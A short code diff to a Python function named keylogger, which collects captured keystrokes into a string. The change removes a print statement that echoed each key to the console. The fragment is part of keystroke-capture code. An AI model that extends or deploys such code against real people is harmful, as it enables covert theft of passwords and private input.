@@ -15,7 +15,6 @@ def keylogger(key):
             tmp = "'"
         else:
             tmp = tmp.replace("'", "")
-        print(tmp)
         cont += str(tmp)
     return
         
